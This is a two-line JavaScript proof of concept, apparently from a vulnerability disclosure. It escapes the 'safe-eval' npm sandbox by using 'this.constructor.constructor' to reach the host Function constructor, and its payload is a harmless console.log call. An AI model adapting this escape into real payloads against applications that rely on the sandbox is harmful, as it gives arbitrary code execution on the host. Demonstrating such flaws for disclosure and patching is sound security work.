var safeEval = require('safe-eval');
safeEval("this.constructor.constructor('return console.log')(123)")(123);
